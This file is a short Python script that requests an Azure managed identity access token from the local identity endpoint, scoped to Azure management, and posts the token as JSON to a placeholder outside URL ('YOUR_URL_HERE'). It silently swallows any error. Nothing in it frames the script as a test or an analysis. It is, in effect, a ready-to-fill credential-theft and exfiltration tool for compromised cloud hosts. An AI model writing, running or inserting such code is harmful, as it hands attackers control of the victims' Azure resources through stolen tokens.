import os
import requests
import json

endpoint_url = "https://YOUR_URL_HERE"
identity_endpoint = os.getenv('IDENTITY_ENDPOINT')
if not identity_endpoint:
    raise ValueError("IDENTITY_ENDPOINT environment variable not set.")

# Fetch the token
params = {
    'api-version': '2018-02-01',
    'resource': 'https://management.azure.com/'
}
headers = {
    'Metadata': 'true'
}

try:
    response = requests.get(identity_endpoint, params=params, headers=headers)
    response.raise_for_status()
    token = response.json()
    
    # Send the token to the specified endpoint
    post_headers = {
        'Content-Type': 'application/json'
    }
    data = {
        'token': token
    }
    
    post_response = requests.post(endpoint_url, headers=post_headers, data=json.dumps(data))
    post_response.raise_for_status()
    
    #return post_response.json()
except requests.exceptions.RequestException as e:
    print("An exception occurred")

